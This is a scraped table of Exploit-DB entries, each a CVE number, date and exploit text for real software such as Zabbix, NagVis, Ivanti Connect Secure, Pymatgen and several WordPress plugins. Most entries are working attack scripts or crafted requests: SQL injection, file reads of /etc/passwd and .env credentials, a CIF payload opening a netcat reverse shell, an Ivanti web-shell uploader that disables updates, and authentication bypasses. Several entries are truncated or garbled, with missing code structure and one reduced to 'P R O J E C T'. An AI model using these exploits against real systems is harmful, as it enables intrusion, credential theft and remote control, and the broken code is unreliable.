CVE-2024-46278,2025-04-16,exploit db,# Exploit Title: Teedy 1.11 - Account Takeover via Stored Cross-Site Scripting (XSS) # Exploit Author: Ayato Shitomi @ Fore-Z co.ltd # Demo Video: https://www.youtube.com/watch?v=udQgVogsmhA # Vendor Homepage: https://teedy.io/ # Software Link: https://github.com/Tomblib0/Teedy # Version: 1.11 # Tested on: Linux # CVE : CVE-2024-46278 There is a vulnerability that causes XSS when downloading files. XSS vulnerability could allow a Teedy administrator to rob an account with a few clicks. Login as an attacker’s account. Upload this file as html type. You have to change “Origin” and “Referer” and argument for fetch in need. Login with another account. eg. admin Click on the file uploaded by the attacker and select Download this file.
CVE-2022-46945,2025-04-16,exploit db,"# Exploit Title: NagVis 1.9.33 - Arbitrary File Read # Date: 03/12/2024 # Exploit Author: David Rodríguez a.k.a. xerosec # Vendor Homepage: https://www.nagvis.org/ # Software Link: https://www.nagvis.org/downloads/archive # Version: 1.9.33 # Tested on: Linux # CVE: CVE-2022-46945 import requests import argparse import json from urllib.parse import urljoin def authenticate(target_url, username, password): url = urljoin(target_url, '/nagvis/frontend/nagvis-js/index.php') headers = {""User-Agent"": ""Mozilla/5.0"", ""Content-Type"": ""application/x-www-form-urlencoded""} data = {""_username"": username, ""_password"": password, ""submit"": ""Login""} try: response = requests.post(url, headers=headers, data=data) if response.status_code == 200 and ""Set-Cookie"" in response.headers: print(""[✔] Authentication successful."") return response.headers[""Set-Cookie""] print(f""[✘] Authentication failed. Status code: {response.status_code}"") except Exception as e: print(f""[✘] Request error: {e}"") return None def exploit(target_url, session_cookie, file_path): url = urljoin(target_url, '/nagvis/server/core/ajax_handler.php') headers = {""User-Agent"": ""Mozilla/5.0"", ""Cookie"": session_cookie} params = {""mod"": ""General"", ""act"": ""getHoverUrl"", ""url[]"": f""file://{file_path}""} try: response = requests.get(url, headers=headers, params=params) if response.status_code == 200: print(""[✔] Exploitation successful. File content:\n"") display_file_content(response.text) else: print(f""[✘] Exploitation failed. Status code: {response.status_code}"") except Exception as e: print(f""[✘] Request error: {e}"") def display_file_content(raw_response): try: data = json.loads(raw_response) if isinstance(data, list) and len(data) > 0 and isinstance(data[0], dict) and ""code"" in data[0]: content = data[0][""code""] # Decodificar escapes de manera segura content = content.encode('utf-8').decode('unicode_escape') print(content.strip()) else: print(""[✘] Unexpected JSON structure."") except json.JSONDecodeError as jde: print(f""[✘] JSON decoding error: {jde}"") except Exception as e: print(f""[✘] Unexpected error during output processing: {e}"") def main(): parser = argparse.ArgumentParser(description=""Exploit for CVE-2022-46945 (File Read Vulnerability)"") parser.add_argument(""-t"", ""--target"", required=True, help=""Target base URL (e.g., http://10.0.2.132)"") parser.add_argument(""-u"", ""--username"", required=True, help=""Username for authentication"") parser.add_argument(""-p"", ""--password"", required=True, help=""Password for authentication"") parser.add_argument(""-f"", ""--file"", required=True, help=""File path to read (e.g., /etc/passwd)"") args = parser.parse_args() session_cookie = authenticate(args.target, args.username, args.password) if session_cookie: exploit(args.target, session_cookie, args.file) if __name__ == ""__main__"": main()"
CVE-2024-42327,2025-04-16,exploit db,"# Exploit Title: Zabbix 7.0.0 - SQL Injection # Date: 06/12/2024 # Exploit Author: Leandro Dias Barata @m4nb4 # Vendor Homepage: https://www.zabbix.com/ # Software Link: https://support.zabbix.com/browse/ZBX-25623 # Version: 6.0.0 - 6.0.31 / 6.0.32rc1 6.4.0 - 6.4.16 / 6.4.17rc1 7.0.0 # Tested on: Kali Linux kali-linux-2024.3 # CVE: CVE-2024-42327 import requests import argparse HEADERS = {""Content-Type"": ""application/json""} def main(): parser = argparse.ArgumentParser(description=""CHECK for CVE-2024-42327"") parser.add_argument(""-t"", ""--target"", required=True, help=""API URL"") parser.add_argument(""-u"", ""--username"", required=True, help=""Username"") parser.add_argument(""-p"", ""--password"", required=True, help=""Password"") args = parser.parse_args() url = f""{args.target.rstrip('/')}/api_jsonrpc.php"" # Login to get the token login_data = { ""jsonrpc"": ""2.0"", ""method"": ""user.login"", ""params"": {""username"": args.username, ""password"": args.password}, ""id"": 1, ""auth"": None try: login_response = requests.post(url, json=login_data, headers=HEADERS) login_response.raise_for_status() auth_token = login_response.json().get(""result"") # Simple SQLi test data = { ""jsonrpc"": ""2.0"", ""method"": ""user.get"", ""params"": { ""selectRole"": [""roleid"", ""name"", ""type"", ""readonly AND (SELECT(SLEEP(5)))""], ""userids"": [""1"", ""2""] ""id"": 1, ""auth"": auth_token test_response = requests.post(url, json=data, headers=HEADERS) test_response.raise_for_status() if ""error"" in test_response.text: print(""[-] NOT VULNERABLE."") else: print(""[!] VULNERABLE."") except requests.RequestException as e: print(f""[!] Request error: {e}"") if __name__ == ""__main__"": main()"
CVE-2024-55889,2025-04-16,exploit db,"# Exploit Title: phpMyFAQ v3.2.10 - Unintended File Download Triggered by Embedded Frames # Date: 13 Dec 2024 # Exploit Author: George Chen # Vendor Homepage: https://github.com/thorsten/phpMyFAQ/ # Software Link: https://github.com/thorsten/phpMyFAQ/ # Version: v3.2.10 # Tested on: Mac, Win # CVE : CVE-2024–55889 *Summary* A vulnerability exists in the FAQ Record component of https://github.com/thorsten/phpMyFAQ v3.2.10 where a privileged attacker can trigger a file download on a victim’s machine upon page visit by embedding it in an"
CVE-2018-16606,2025-04-16,exploit db,"# Exploit Title: ProConf 6.0 - Insecure Direct Object Reference (IDOR) # Date: 19/07/2018 # Exploit Author: S. M. Zia Ur Rashid, SC # Author Contact: https://www.linkedin.com/in/ziaurrashid/ # Vendor Homepage: http://proconf.org & http://myproconf.org # Version: <= 6.0 # Tested on: Windows # CVE : CVE-2018-16606 # Patched Version: 6.1 # Description: In ProConf before 6.1, an Insecure Direct Object Reference (IDOR) allows any author to view and grab all submitted papers (Title and Abstract) and their authors' personal information (Name, Email, Organization, and Position) by changing the value of Paper ID (the pid parameter). # PROOF-OF-CONCEPT Step 1: Sign In as an author for a conference & submit a paper. Youall get a paper ID. Step 2: Now go to paper details and change the value of Paper ID (param pid=xxxx) to nearest previous value to view others submitted paper & authors information. http:// [host]/conferences/[conference-name]/author/show_paper_details.php?pid=xxxx"
CVE-2022-41358,2025-04-16,exploit db,"# Exploit Title: Garage Management System 1.0 (categoriesName) - Stored XSS # Date: 18-09-2022 # Exploit Author: Sam Wallace, SC # Software Link: https://www.sourcecodester.com/php/15485/garage-management-system-using-phpmysql-source-code.html # Version: 1.0 # Tested on: Debian # CVE : CVE-2022-41358 Summary: Garage Management System utilizes client side validation to prevent XSS. Using burp, a request can be modified and replayed to the server bypassing this validation which creates an avenue for XSS. Parameter: categoriesName URI: /garage/php_action/createCategories.php"
CVE-2022-37061,2025-04-16,exploit db,"# Exploit Title: FLIR AX8 1.46.16 - Remote Command Injection # Date: 8/19/2022 # Exploit Author: Samy Younsi Naqwada (https://samy.link), SC # Vendor Homepage: https://www.flir.com/ # Software Link: https://www.flir.com/products/ax8-automation/"
CVE-2022-23409,2025-04-16,exploit db,"# Exploit Title: Ethercreative Logs 3.0.3 - Path Traversal # Date: 2022.01.26 # Exploit Author: Steffen Rogge, SC # Vendor Homepage: https://github.com/ethercreative/logs # Software Link: https://plugins.craftcms.com/logs # Version: <=3.0.3 # Tested on: Linux # CVE : CVE-2022-23409 product: Ethercreative Logs plugin for Craft CMS fixed version: >=3.0.4 impact: Medium found: 2021-07-06 SEC Consult Vulnerability Lab An integrated part of SEC Consult, an Atos company Europe | Asia | North America https://www.sec-consult.com Vendor description: ""A quick and dirty way to access your logs from inside the CP"" As found on the plugin store page: https://plugins.craftcms.com/logs Active Installs 4,093 (as of 2021-07-07) Business recommendation: The vendor provides a patched version v3.0.4 which should be installed immediately. Vulnerability overview/description: 1) Authenticated Path Traversal (CVE-2022-23409) The plugin ""Logs"" provides a functionality to read log files of the Craft CMS system inside the backend of the CMS. As the requested logfile is not properly validated, an attacker is able to request arbitrary files from the underlying file system with the permissions of the web service user. Proof of concept: 1) Authenticated Path Traversal (CVE-2022-23409) As the plugin is installed as an administrator of the system and the function is only accessible after being logged in as an admin, an attacker needs to be authenticated as an administrator in the backend in order to extract the needed ""{MD5}_identity"" cookie for the crafted request. The vulnerable endpoint is provided by the plugin under the following path: https://vulnerablesite.com/index.php/admin/actions/logs/logs/stream The vulnerable controller for that endpoint can be found here: https://github.com/ethercreative/logs/blob/master/src/Controller.php The function ""actionStream()"" provides an endpoint for the Craft CMS and does not validate input values before file content is being read by the function ""file_get_contents"". public function actionStream () $logsDir = \Craft::getAlias('@storage/logs'); $logFile = \Craft::$app->request->getParam('log'); $currentLog = \Craft::$app->request->get('log', $logFile); $log = file_get_contents($logsDir . '/' . $currentLog); exit($log); A crafted GET parameter with the name ""log"" can be used to access files on the underlying filesystem with rights as the user executing the web server. In most cases this will be the user ""www-data"". In order to read the file "".env"" or "".env.php"" which contains the environment configuration and as such also the database credentials, the following request can be used: GET /admin/actions/logs/logs/stream?log=../../.env HTTP/1.1 Host: User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0 Connection: close Cookie: 1031b8c41dfff97a311a7ac99863bdc5_identity= ; The response then discloses the file content of the file "".env"": HTTP/1.1 200 OK Date: Thu, 07 Jul 2021 10:08:52 GMT Server: nginx Content-Type: text/html; charset=UTF-8 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Set-Cookie: CraftSessionId=2uisculfj8t9q1tnbiukl6ogjf; path=/; secure; HttpOnly Content-Length: 1600 Connection: close $craftEnvVars = [ 'DB_DRIVER' => 'mysql', 'DB_SERVER' => '********', 'DB_USER' => '********', 'DB_PASSWORD' => '********', 'DB_DATABASE' => '********', 'DB_SCHEMA' => 'public', 'DB_TABLE_PREFIX' => '', 'DB_PORT' => '********', 'SECURITY_KEY' => '********', Vulnerable / tested versions: The following version has been tested which was the latest version available at the time of the test: * Version 3.0.3 released on November 25, 2019 Distributed through the Craft Plugin Store https://plugins.craftcms.com/logs Vendor contact timeline: 2021-07-07: Contacting vendor through dev@ethercreative.co.uk 2021-07-08: Response from vendor, no encryption available but vendor accepted to be responsible for any risks involved with plaintext communication 2021-07-08: Advisory was sent to vendor unencrypted 2021-07-09: Vendor released a patch for this vulnerability with version 3.0.4 (https://github.com/ethercreative/logs/commit/eb225cc78b1123a10ce2784790f232d71c2066c4) 2021-07-12: Updated Plugin has been tested on an up-to-date CraftCMS installation (CraftCMS 3.7.0, PHP 8, MySQL 8, Logs Plugin 3.0.4) 2022-01-24: Release of security advisory Solution: The vendor released a patched version 3.0.4 or higher which can be retrieved from their website/github: https://plugins.craftcms.com/logs https://github.com/ethercreative/logs/commit/eb225cc78b1123a10ce2784790f232d71c2066c4 Workaround: Uninstall/Disable the plugin and access the Craft CMS logs via SSH or other services. Advisory URL: https://sec-consult.com/vulnerability-lab/ SEC Consult Vulnerability Lab SEC Consult, an Atos company Europe | Asia | North America About SEC Consult Vulnerability Lab The SEC Consult Vulnerability Lab is an integrated part of SEC Consult, an Atos company. It ensures the continued knowledge gain of SEC Consult in the field of network and application security to stay ahead of the attacker. The SEC Consult Vulnerability Lab supports high-quality penetration testing and the evaluation of new offensive and defensive technologies for our customers. Hence our customers obtain the most current information about vulnerabilities and valid recommendation about the risk profile of new technologies. Interested to work with the experts of SEC Consult? Send us your application https://sec-consult.com/career/ Interested in improving your cyber security with the experts of SEC Consult? Contact our local offices https://sec-consult.com/contact/ Mail: research at sec-consult dot com Web: https://www.sec-consult.com Blog: http://blog.sec-consult.com Twitter: https://twitter.com/sec_consult EOF Steffen Rogge / @2022"
CVE-2020-5509,2025-04-16,exploit db,"# Exploit Title: Car Rental Project 1.0 - Remote Code Execution # Date: 1/3/2020 # Exploit Author: FULLSHADE, SC # Vendor Homepage: https://phpgurukul.com/ # Software Link: https://phpgurukul.com/car-rental-project-php-mysql-free-download/ # Version: 1.0 # Tested on: Windows # CVE : CVE-2020-5509 # Information & description # Car Rental Project v.1.0 is vulnerable to arbitrary file upload since an admin can change the image of a product and the file change PHP code doesn't validate or care what type of file is submitted, which leads to an attack having the ability to upload malicious files. This Python"
CVE-2024-0566,2025-04-16,exploit db,"# Exploit Title: Smart Manager 8.27.0 - Post-Authenticated SQL Injection # Date: 2024-01-18 # Exploit Author: Ivan Spiridonov - xbz0n # Vendor Homepage: https://www.storeapps.org/ # Software Link: https://www.storeapps.org/product/smart-manager/ # Version: 8.27.0 # Tested on: Ubuntu 22.04 # CVE: CVE-2024-0566 ## SQL Injection The plugin does not properly sanitize and escape a parameter before using it in an SQL statement, leading to an SQL injection exploitable by high-privilege users such as admin. ## Affected Components - **Plugin:** Smart Manager - **Version:** 8.27.0 - **Affected Parameters:** 'sort_params%5BsortOrder%5D', 'sort_params%5Bcolumn%5D' - **Affected Endpoint:** /wp-admin/admin-ajax.php ## Description The vulnerability is located within the admin AJAX endpoint in the sorting parameters 'sort_params%5BsortOrder%5D' and 'sort_params%5Bcolumn%5D'. By manipulating these parameters, authenticated attackers can inject SQL commands, leading to a time-based SQL Injection vulnerability. ## Proof of Concept ### Manual Exploitation ```http POST /wp-admin/admin-ajax.php?action=sm_beta_include_file HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0 Accept: text/plain, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/admin.php?page=smart-manager Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 1117 Origin: http://localhost Connection: close Cookie: Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin cmd=get_data_model&active_module=product&security=37e8d818b7&is_public=1&sm_page=1&sm_limit=50&SM_IS_WOO30=true&sort_params%5Bcolumn%5D=postmeta%2Fmeta_key%3D_tax_status%2Fmeta_value%3D_tax_status&sort_params%5BsortOrder%5D=asc%2c(select*from(select(sleep(20)))a)&table_model%5Bposts%5D%5Bpkey%5D=ID&table_model%5Bposts%5D%5Bjoin_on%5D=&table_model%5Bposts%5D%5Bwhere%5D%5Bpost_type%5D%5B%5D=product&table_model%5Bposts%5D%5Bwhere%5D%5Bpost_type%5D%5B%5D=product_variation&table_model%5Bposts%5D%5Bwhere%5D%5Bpost_status%5D=any&table_model%5Bpostmeta%5D%5Bpkey%5D=post_id&table_model%5Bpostmeta%5D%5Bjoin_on%5D=postmeta.post_ID+%3D+posts.ID&table_model%5Bterm_relationships%5D%5Bpkey%5D=object_id&table_model%5Bterm_relationships%5D%5Bjoin_on%5D=term_relationships.object_id+%3D+posts.ID&table_model%5Bterm_taxonomy%5D%5Bpkey%5D=term_taxonomy_id&table_model%5Bterm_taxonomy%5D%5Bjoin_on%5D=term_taxonomy.term_taxonomy_id+%3D+term_relationships.term_taxonomy_id&table_model%5Bterms%5D%5Bpkey%5D=term_id&table_model%5Bterms%5D%5Bjoin_on%5D=terms.term_id+%3D+term_taxonomy.term_id&search_text=&advanced_search_query=%5B%5D&is_view=0&isTasks=0&is_taxonomy=0 If the server response is delayed by approximately 20 seconds, it indicates a successful exploitation of the time-based SQL Injection, confirming the vulnerability. ## Recommendations Users of Smart Manager v8.27.0 are strongly advised to restrict access to the affected endpoint and update the plugin to the latest version."
CVE-2024-0399,2025-04-16,exploit db,"# Exploit Title: WooCommerce Customers Manager 29.4 - Post-Authenticated SQL Injection # Date: 2024-03-25 # Exploit Author: Ivan Spiridonov - xbz0n # Software Link: https://codecanyon.net/item/woocommerce-customers-manager/10965432 # Version: 29.4 # Tested on: Ubuntu 22.04 # CVE: CVE-2024-0399 ## SQL Injection The plugin does not properly sanitise and escape a parameter before using it in a SQL statement, leading to an SQL injection exploitable by Subscriber+ role. ## Affected Components - **Plugin:** WooCommerce Customers Manager - **Version:** 29.4 - **Affected Parameters:** 'max_amount', 'max_amount_total', 'min_amount', 'min_amount_total' - **Affected Endpoint:** /wp-admin/admin-ajax.php ## Description The vulnerability is located within the transaction amount parameters like 'max_amount', 'max_amount_total', 'min_amount', and 'min_amount_total' used in the admin AJAX endpoint. By injecting SQL commands into these parameters, authenticated attackers can manipulate SQL queries leading to a time-based SQL Injection vulnerability. ## Proof of Concept ### Manual Exploitation ```http POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/admin.php?page=wccm-discover-customer X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=---------------------------2461714219322283440478088295 Content-Length: 1877 Origin: http://localhost Connection: close Cookie: Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""action"" wccm_get_orders_tot_num -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""start_date"" 2024-01-09 -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""end_date"" 2024-01-11 -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""customer_ids"" -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""product_ids"" -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""category_ids"" -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""min_amount"" 0 -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""max_amount"" 0 -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""min_amount_total"" 0 -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""max_amount_total"" (select*from(select(sleep(20)))a) -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""product_relationship"" or -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""product_category_relationship"" or -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""product_category_filters_relationship"" and -----------------------------2461714219322283440478088295 Content-Disposition: form-data; name=""statuses"" wc-pending,wc-processing,wc-on-hold,wc-completed,wc-cancelled,wc-refunded,wc-failed,wc-checkout-draft -----------------------------2461714219322283440478088295-- If the server response is delayed by approximately 20 seconds, it indicates a successful exploitation of the time-based SQL Injection, confirming the vulnerability. ## Recommendations Users of WooCommerce Customers Manager v29.4 are strongly advised to restrict access to the affected endpoint and update the plugin as soon as a fixed version is released. This advisory serves as a notice to all users of Smart Manager v8.27.0 to take immediate action in updating their plugin to protect against this SQL Injection vulnerability."
CVE-2024-48846,2025-04-16,exploit db,P R O J E C T
CVE-2024-23346,2025-04-15,exploit db,"# Exploit Title : Pymatgen 2024.1 - Remote Code Execution (RCE) # Google Dork : (not applicable) # Date : 2024-11-13 # Exploit Author : Mohammed Idrees Banyamer # Vendor Homepage : https ://pymatgen.org # Software Link : https ://pypi.org /project /pymatgen/ # Version : 2024.1 # Tested on : Kali Linux 2024.1 # CVE : CVE-2024-23346 import os # Function to create the malicious CIF file def create_malicious_cif(ip, port): # Constructing the malicious CIF file with reverse shell payload malicious_cif = f"""""" data_5yOhtAoR _audit_creation_date 2024-11-13 _audit_creation_method ""CVE-2024-23346 Pymatgen CIF Parser Reverse Shell Exploit"" loop_ _parent_propagation_vector.id _parent_propagation_vector.kxkykz k1 [0 0 0] _space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[""__sub"" + ""classes__""]) () if d.__name__ == ""BuiltinImporter""][0].load_module (""os"").system (""nc {ip} {port} -e /bin/bash"");0,0,0' _space_group_magn.number_BNS 62.448 _space_group_magn.name_BNS ""P n' m a' "" # Save to a file with open(""vuln.cif"", ""w"") as file: file.write(malicious_cif) print(""[*] Malicious CIF file created: vuln.cif"") # Function to trigger the exploit by parsing the malicious CIF file def exploit(): ip = input(""Enter your IP address for the reverse shell: "") port = input(""Enter the port for the reverse shell to listen on: "") # Create the malicious CIF file create_malicious_cif(ip, port) # Trigger the Pymatgen CIF parser to parse the malicious file from pymatgen.io.cif import CifParser parser = CifParser(""vuln.cif"") structure = parser.parse_structures() # Running the exploit if __name__ == ""__main__"": exploit()"
CVE-2025-0282,2025-04-15,exploit db,"# Exploit Title: Ivanti Connect Secure 22.7R2.5 - Remote Code Execution (RCE) # Date: 2025-01-11 # Exploit Author: @absholi7ly # CVE: CVE-2025-0282 import requests import sys import struct import socket import ssl import urllib3 import time # Disable SSL warnings urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) def create_exploit_payload(command, offset=500, system_address=0x0804a360, command_address=0x0804b008): payload = b""A"" * offset # Fill the buffer payload += struct.pack("" /shell.php"" exploit_vulnerability(target_ip, command) print(""[+] Web shell uploaded successfully at /shell.php."") verify_shell(target_ip) except Exception as e: print(f""[-] Error uploading web shell: {e}"") def verify_shell(target_ip): shell_url = f""http://{target_ip}/shell.php"" try: response = requests.get(shell_url, verify=False, timeout=10) if response.status_code == 200: print(""[+] Web shell is accessible."") else: print(f""[-] Web shell is not accessible. HTTP status: {response.status_code}"") except Exception as e: print(f""[-] Error verifying web shell: {e}"") def execute_shell_command(target_ip, command): shell_url = f""http://{target_ip}/shell.php"" try: # Sending the command via POST response = requests.post(shell_url, data={""cmd"": command}, verify=False, timeout=10) if response.status_code == 200: print(f""[+] Command output:\n{response.text.strip()}"") else: print(f""[-] Failed to execute command via shell. HTTP status: {response.status_code}"") except Exception as e: print(f""[-] Error executing command via web shell: {e}"") def disable_updates(target_ip): commands = [ ""systemctl stop apt-daily.service"", ""systemctl disable apt-daily.service"" for command in commands: execute_shell_command(target_ip, command) print(""[+] System updates disabled successfully."") def main(): if len(sys.argv) != 3: print(""Usage: python3 cve_2025_0282.py "") sys.exit(1) target_ip = sys.argv[1] local_shell_path = sys.argv[2] # Upload the web shell upload_web_shell(target_ip, local_shell_path) while True: command = input(""Enter command to execute on the target (or 'exit' to quit): "") if command.lower() == ""exit"": print(""Exiting..."") break execute_shell_command(target_ip, command) if __name__ == ""__main__"": main()"
CVE-2024-52302,2025-04-15,exploit db,"# Exploit Title: Unrestricted File Upload # Google Dork: # Date: 14/Nov/2024 # Exploit Author: d3sca # Vendor Homepage: https://github.com/OsamaTaher/Java-springboot-codebase # Software Link: https://github.com/OsamaTaher/Java-springboot-codebase # Version: [app version] 0.1 # Tested on: Debian Linux # CVE : CVE-2024-52302 # Steps to Reproduce: # Upload Malicious File: Send a PUT request to /api/v1/customer/profile-picture using customer with role 26,17 added with a malicious file payload (e.g., .jsp, .php, .html). # GET the file location: Send GET request /api/v1/customer/my-profile , grap the file location in response with the profile's link. # Execute the Uploaded File: Using the file name access the file directly through the URL returned in the response. # If the server supports the uploaded file type, it will execute the file, leading to Remote Code Execution. import requests import argparse import sys requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) def login(url, username, password): """"""Authenticate with the API and return the Bearer token."""""" login_endpoint = f""{url}/api/v1/user/login"" headers = {""Content-Type"": ""application/json""} payload = { ""username"": username, ""password"": password try: response = requests.post(login_endpoint, json=payload, headers=headers, verify=False) response.raise_for_status() # Extract token token = response.json().get(""token"") if not token: print(""[!] Token not found in response. Exiting."") sys.exit(1) print(""[+] Authentication successful. Token acquired."") return token except Exception as e: print(f""[!] Login failed: {e}"") sys.exit(1) def upload_file(url, token, file_path): """"""Upload a file to the profile picture endpoint using the Bearer token."""""" upload_endpoint = f""{url}/api/v1/customer/profile-picture"" headers = { ""Authorization"": f""Bearer {token}"" files = { ""file"": open(file_path, ""rb"") try: response = requests.post(upload_endpoint, headers=headers, files=files, verify=False) response.raise_for_status() if response.status_code == 200: print(""[+] File uploaded successfully."") print(f""[+] Response: {response.text}"") else: print(f""[!] Failed to upload file. Status code: {response.status_code}"") print(f""[!] Response: {response.text}"") except Exception as e: print(f""[!] File upload failed: {e}"") sys.exit(1) def main(): parser = argparse.ArgumentParser(description=""Exploit script for unrestricted file upload vulnerability."") parser.add_argument(""-u"", ""--username"", required=True, help=""Username for login"") parser.add_argument(""-p"", ""--password"", required=True, help=""Password for login"") parser.add_argument(""-f"", ""--file"", required=True, help=""File to upload"") parser.add_argument(""-url"", ""--url"", required=True, help=""Base URL of the target application (e.g., https://target.com)"") args = parser.parse_args() # Authenticate token = login(args.url, args.username, args.password) # Upload the file upload_file(args.url, token, args.file) if __name__ == ""__main__"": main()"
CVE-2024-10924,2025-04-15,exploit db,"#!/usr/bin/env python3 # Exploit Title: Really Simple Security 9.1.1.1 - Authentication Bypass # Date: 2024-11-19 # Exploit Author: Antonio Francesco Sardella # Vendor Homepage: https://really-simple-ssl.com/ # Software Link: https://really-simple-ssl.com/ # Version: Really Simple Security (Free, Pro, and Pro Multisite) 9.0.0 - 9.1.1.1 # Tested on: 'WordPress 6.7.0' in Docker container (vulnerable application), 'Ubuntu 24.04.1 LTS' with 'Python 3.12.3' (script execution) # CVE: CVE-2024-10924 # Category: WebApps # Repository: https://github.com/m3ssap0/wordpress-really-simple-security-authn-bypass-exploit # Vulnerability discovered and reported by: István Márton # This is a Python3 program that exploits Really Simple Security < 9.1.2 authentication bypass vulnerability. # This makes it possible for unauthenticated attackers to log in as any existing user on the site, # such as an administrator, when the ""Two-Factor Authentication"" setting is enabled (disabled by default). # https://www.wordfence.com/threat-intel/vulnerabilities/detail/really-simple-security-free-pro-and-pro-multisite-900-9111-authentication-bypass # https://plugins.trac.wordpress.org/changeset/3188431/really-simple-ssl # DISCLAIMER: This tool is intended for security engineers and appsec people for security assessments. # Please use this tool responsibly. I do not take responsibility for the way in which any one uses # this application. I am NOT responsible for any damages caused or any crimes committed by using this tool. import argparse import json import logging import random import requests import string import validators from requests.auth import HTTPBasicAuth VERSION = ""v1.0 (2024-11-19)"" DEFAULT_LOGGING_LEVEL = logging.INFO def parse_arguments(): parser = argparse.ArgumentParser( description=f""Exploit for Really Simple Security < 9.1.2 authentication bypass vulnerability (CVE-2024-10924). - {VERSION}"" parser.add_argument(""-t"", ""--target"", required=True, help=""URL of the target WordPress"") parser.add_argument(""-uid"", ""--user-id"", required=False, default=1, help=""Victim user ID (1 is usually the admin)."") parser.add_argument(""-v"", ""--verbose"", action=""store_true"", required=False, default=False, help=""verbose mode"") return parser.parse_args() def validate_input(args): try: validators.url(args.target) except validators.ValidationFailure: raise ValueError(""Invalid target URL!"") try: if int(args.user_id) < 1: raise ValueError(""Invalid user ID!"") except ValueError: raise ValueError(""Invalid user ID!"") def send_request(url, user_id): logging.info(""Sending request to target WordPress."") target_endpoint = f""{url}"" if not target_endpoint.endswith(""/""): target_endpoint = f""{target_endpoint}/"" target_endpoint = f""{target_endpoint}?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"" headers = { ""Content-Type"": ""application/json"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"", body = { ""user_id"": int(user_id), ""login_nonce"": """".join(random.choices(string.digits, k=10)), ""redirect_to"": ""/wp-admin/"" logging.debug(f""Body: {body}"") try: r = requests.post(target_endpoint, headers=headers, json=body , verify=False) logging.info(f""Request sent to target WordPress (HTTP {r.status_code})."") except Exception as e: logging.fatal(""Error in contacting the target WordPress."") logging.fatal(e) return if r.status_code == 200 and r.headers[""Set-Cookie""] is not None and ""redirect_to"" in r.text and ""=deleted;"" not in r.headers[""Set-Cookie""]: logging.info(f""Cookie received:\n---------------------\n{r.headers[""Set-Cookie""]}\n---------------------"") else: logging.fatal(""Wrong response received from the target WordPress."") logging.debug(f""Cookie and body received:\n---------------------\n{r.headers[""Set-Cookie""]}\n---------------------\n{r.text}\n---------------------"") def main(): args = parse_arguments() logging_level = DEFAULT_LOGGING_LEVEL if args.verbose: logging_level = logging.DEBUG logging.basicConfig(level=logging_level, format=""%(asctime)s - %(levelname)s - %(message)s"") validate_input(args) target = args.target.strip() user_id = int(args.user_id) logging.info(f""Exploit for Really Simple Security < 9.1.2 authentication bypass vulnerability (CVE-2024-10924). - {VERSION}"") logging.debug(""Parameters:"") logging.debug(f"" target = {target}"") logging.debug(f"" user_id = {user_id}"") send_request(target, user_id) logging.info(""Finished."") if __name__ == ""__main__"": main()"
CVE-2024-50672,2025-04-15,exploit db,"# Exploit Title: Adapt Authoring Tool 0.11.3 - Remote Command Execution (RCE) # Date: 2024-11-24 # Exploit Author: Eui Chul Chung # Vendor Homepage: https://www.adaptlearning.org/ # Software Link: https://github.com/adaptlearning/adapt_authoring # Version: 0.11.3 # CVE Identifier: CVE-2024-50672 , CVE-2024-50671 import io import sys import json import zipfile import argparse import requests import textwrap def get_session_cookie(username, password): data = {""email"": username, ""password"": password} res = requests.post(f""{args.url}/api/login"", data=data) if res.status_code == 200: print(f""[+] Login as {username}"") return res.cookies.get_dict() return None def get_users(): session_cookie = get_session_cookie(args.username, args.password) if session_cookie is None: print(""[-] Login failed"") sys.exit() res = requests.get(f""{args.url}/api/user"", cookies=session_cookie) users = [ {""email"": user[""email""], ""role"": user[""roles""][0][""name""]} for user in json.loads(res.text) roles = {""Authenticated User"": 1, ""Course Creator"": 2, ""Super Admin"": 3} users.sort(key=lambda user: roles[user[""role""]]) for user in users: print(f""[+] {user['email']} ({user['role']})"") return users def reset_password(users): # Overwrite potentially expired password reset tokens for user in users: data = {""email"": user[""email""]} requests.post(f""{args.url}/api/createtoken"", data=data) print(""[+] Generate password reset token for every user"") valid_characters = ""0123456789abcdef"" next_tokens = [""^""] # Ensure that only a single result is returned at a time while next_tokens: prev_tokens = next_tokens next_tokens = [] for token in prev_tokens: for ch in valid_characters: data = {""token"": {""$regex"": token + ch}, ""password"": ""HaXX0r3d!""} res = requests.put( 